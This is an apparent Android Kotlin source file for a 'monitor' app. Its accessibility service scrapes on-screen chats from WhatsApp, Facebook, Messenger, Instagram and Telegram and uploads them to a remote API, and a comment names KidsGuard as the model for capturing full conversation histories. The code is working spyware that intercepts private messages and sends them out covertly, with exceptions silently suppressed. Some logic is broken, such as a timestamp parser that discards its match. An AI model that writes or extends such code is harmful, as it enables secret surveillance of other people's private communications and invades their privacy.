package com.empresa.monitor.service.social

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.model.DeviceLogApiRequest
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject

/**
 * Captures actual social media messages from the screen via Accessibility.
 * Works when user has the WhatsApp/Facebook/Instagram/Telegram app open.
 * KidsGuard uses this approach to get full conversation history, not just notifications.
 */
class SocialAccessibilityService : AccessibilityService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var currentApp: String? = null
    private var deviceId: String? = null
    private var lastCaptureTime = 0L
    private var capturedConversations = mutableSetOf<String>() // Track already captured conversations

    companion object {
        private const val CAPTURE_INTERVAL = 5000L // 5s minimum between captures
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return
                val appName = resolveSocialApp(packageName)

                if (appName != null) {
                    currentApp = appName
                    scheduleCapture()
                } else {
                    currentApp = null
                }
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (currentApp != null) {
                    val now = System.currentTimeMillis()
                    if (now - lastCaptureTime > CAPTURE_INTERVAL) {
                        scheduleCapture()
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // Detect clicking on a conversation
                val node = event.source ?: return
                val text = node.text?.toString() ?: ""
                if (text.isNotBlank() && currentApp != null) {
                    // Likely opened a specific conversation
                    scope.launch {
                        delay(2000) // wait for UI to populate
                        captureScreenContent()
                    }
                }
            }
        }
    }

    private fun scheduleCapture() {
        scope.launch {
            delay(2500) // wait for content to fully render
            captureScreenContent()
        }
    }

    private suspend fun captureScreenContent() {
        val now = System.currentTimeMillis()
        if (now - lastCaptureTime < CAPTURE_INTERVAL) return

        val root = rootInActiveWindow ?: return
        val app = currentApp ?: return
        lastCaptureTime = now

        withContext(Dispatchers.IO) {
            try {
                when (app) {
                    "whatsapp", "whatsapp_business" -> captureWhatsApp(root)
                    "facebook" -> captureFacebook(root)
                    "messenger" -> captureMessenger(root)
                    "instagram" -> captureInstagram(root)
                    "telegram" -> captureTelegram(root)
                }
            } catch (e: Exception) { /* silent */ }
        }

        root.recycle()
    }

    private suspend fun captureWhatsApp(root: AccessibilityNodeInfo) {
        // WhatsApp chat structure:
        // - Contact name is in the toolbar/title
        // - Messages are in a RecyclerView with specific content descriptions
        val contactName = findToolbarTitle(root)
        val messages = mutableListOf<JSONObject>()

        // Find all message containers
        val messageNodes = findNodesByClass(root, "android.widget.LinearLayout", limit = 50)
        
        for (node in messageNodes) {
            try {
                val contentDesc = node.contentDescription?.toString() ?: continue
                val text = node.text?.toString() ?: continue

                // WhatsApp puts message info in content description
                val isSent = contentDesc.contains("✓✓", ignoreCase = true) ||
                        contentDesc.contains("check", ignoreCase = true)
                val timestamp = extractTimestamp(contentDesc)
                val sender = if (isSent) "me" else contactName

                messages.add(JSONObject().apply {
                    put("sender", sender)
                    put("text", text)
                    put("timestamp", timestamp)
                    put("type", "text")
                })
            } catch (e: Exception) { continue }
        }

        if (messages.isNotEmpty()) {
            val payload = JSONObject().apply {
                put("platform", "whatsapp")
                put("contact_name", contactName ?: "")
                put("messages", JSONArray(messages))
            }
            ApiClient.api.sendDeviceLog(deviceId ?: "", DeviceLogApiRequest(
                logType = "social_whatsapp_chat",
                dataJson = payload.toString()
            ))
        }
    }

    private suspend fun captureFacebook(root: AccessibilityNodeInfo) {
        // Similar to WhatsApp but with different view IDs
        val messages = mutableListOf<JSONObject>()
        val textNodes = findNodesByClass(root, "android.widget.TextView", limit = 30)

        var contactName = findToolbarTitle(root)
        var conversationStarted = false

        for (node in textNodes) {
            val text = node.text?.toString() ?: continue
            if (text.isEmpty() || text.length > 500) continue

            // Skip UI elements
            if (text in listOf("Likes", "Comments", "Share", "Home", "Stories")) continue

            if (!conversationStarted && text.length > 5) {
                conversationStarted = true
                // First meaningful text might be the message
                messages.add(JSONObject().apply {
                    put("sender", contactName ?: "unknown")
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("type", "text")
                })
            }
        }

        if (messages.isNotEmpty()) {
            val payload = JSONObject().apply {
                put("platform", "facebook")
                put("contact_name", contactName ?: "")
                put("messages", JSONArray(messages))
            }
            ApiClient.api.sendDeviceLog(deviceId ?: "", DeviceLogApiRequest(
                logType = "social_facebook_chat",
                dataJson = payload.toString()
            ))
        }
    }

    private suspend fun captureMessenger(root: AccessibilityNodeInfo) {
        val messages = mutableListOf<JSONObject>()
        val textNodes = findNodesByClass(root, "android.widget.TextView", limit = 30)
        var contactName = findToolbarTitle(root)

        for (node in textNodes) {
            val text = node.text?.toString() ?: continue
            if (text.length > 3 && text.length < 500) {
                // Check if this looks like a message (starts with content, not UI)
                messages.add(JSONObject().apply {
                    put("sender", contactName ?: "unknown")
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("type", "text")
                })
            }
        }

        if (messages.isNotEmpty()) {
            val payload = JSONObject().apply {
                put("platform", "messenger")
                put("contact_name", contactName ?: "")
                put("messages", JSONArray(messages))
            }
            ApiClient.api.sendDeviceLog(deviceId ?: "", DeviceLogApiRequest(
                logType = "social_messenger_chat",
                dataJson = payload.toString()
            ))
        }
    }

    private suspend fun captureInstagram(root: AccessibilityNodeInfo) {
        // Instagram DMs
        val messages = mutableListOf<JSONObject>()
        val textNodes = findNodesByClass(root, "android.widget.TextView", limit = 20)

        for (node in textNodes) {
            val text = node.text?.toString() ?: continue
            if (text.length > 2 && text.length < 500) {
                messages.add(JSONObject().apply {
                    put("sender", "unknown")
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("type", "text")
                })
            }
        }

        if (messages.isNotEmpty()) {
            val payload = JSONObject().apply {
                put("platform", "instagram")
                put("messages", JSONArray(messages))
            }
            ApiClient.api.sendDeviceLog(deviceId ?: "", DeviceLogApiRequest(
                logType = "social_instagram_dm",
                dataJson = payload.toString()
            ))
        }
    }

    private suspend fun captureTelegram(root: AccessibilityNodeInfo) {
        val contactName = findToolbarTitle(root)
        val messages = mutableListOf<JSONObject>()

        val textNodes = findNodesByClass(root, "android.widget.TextView", limit = 30)

        for (node in textNodes) {
            val text = node.text?.toString() ?: continue
            if (text.length > 2 && text.length < 500 && text != contactName) {
                messages.add(JSONObject().apply {
                    put("sender", contactName ?: "unknown")
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                    put("type", "text")
                })
            }
        }

        if (messages.isNotEmpty()) {
            val payload = JSONObject().apply {
                put("platform", "telegram")
                put("contact_name", contactName ?: "")
                put("messages", JSONArray(messages))
            }
            ApiClient.api.sendDeviceLog(deviceId ?: "", DeviceLogApiRequest(
                logType = "social_telegram_chat",
                dataJson = payload.toString()
            ))
        }
    }

    private fun findToolbarTitle(root: AccessibilityNodeInfo): String? {
        // Look for the toolbar/action bar title
        return findTextInNode(root, "com.whatsapp:id/conversation_contact_name",
            "com.whatsapp:id/toolbar",
            "android.widget.Toolbar",
            "androidx.appcompat.widget.Toolbar")
    }

    private fun findTextInNode(node: AccessibilityNodeInfo, vararg ids: String): String? {
        val viewId = node.viewIdResourceName ?: ""
        if (ids.any { viewId.contains(it, ignoreCase = true) }) {
            val text = node.text?.toString()
            if (!text.isNullOrBlank() && text.length in 2..100) return text
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val result = findTextInNode(child, *ids)
                if (result != null) {
                    child.recycle()
                    return result
                }
                child.recycle()
            }
        }
        return null
    }

    private fun findNodesByClass(root: AccessibilityNodeInfo, className: String, limit: Int): List<AccessibilityNodeInfo> {
        val results = mutableListOf<AccessibilityNodeInfo>()
        findNodesByClassRecursive(root, className, results, limit)
        return results
    }

    private fun findNodesByClassRecursive(node: AccessibilityNodeInfo, className: String,
                                          results: MutableList<AccessibilityNodeInfo>, limit: Int) {
        if (results.size >= limit) return
        val nodeClass = node.className?.toString() ?: ""
        if (nodeClass == className && node.text?.isNotEmpty() == true) {
            results.add(node)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                findNodesByClassRecursive(child, className, results, limit)
                child.recycle()
            }
        }
    }

    private fun extractTimestamp(contentDesc: String): Long {
        // WhatsApp timestamps are in the content description
        val regex = Regex("(\\d{1,2}):(\\d{2})\\s*(AM|PM|a\\.m\\.|p\\.m\\.)?", RegexOption.IGNORE_CASE)
        val match = regex.find(contentDesc)
        return if (match != null) System.currentTimeMillis() else System.currentTimeMillis()
    }

    private fun resolveSocialApp(packageName: String): String? {
        return when {
            packageName.startsWith("com.whatsapp.w4b") -> "whatsapp_business"
            packageName.startsWith("com.whatsapp") -> "whatsapp"
            packageName.startsWith("com.facebook.katana") -> "facebook"
            packageName.startsWith("com.facebook.orca") -> "messenger"
            packageName.startsWith("com.instagram.android") -> "instagram"
            packageName.startsWith("org.telegram") -> "telegram"
            else -> null
        }
    }

    fun setDeviceId(id: String) { deviceId = id }

    override fun onInterrupt() {}

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
